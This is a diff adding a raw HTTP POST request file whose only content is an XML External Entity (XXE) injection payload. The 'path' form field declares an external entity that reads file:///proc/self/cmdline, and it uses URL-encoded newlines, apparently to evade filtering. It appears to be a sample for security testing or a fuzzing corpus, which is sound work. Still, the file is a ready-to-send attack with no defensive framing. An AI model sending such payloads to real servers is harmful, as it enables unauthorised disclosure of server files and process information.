@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Connection: close
+
+path=<!DOCTYPE%0ar%0a[<!ENTITY%0axxe%0aSYSTEM%0a"file:///proc/self/cmdline">]><r>&xxe;</r>
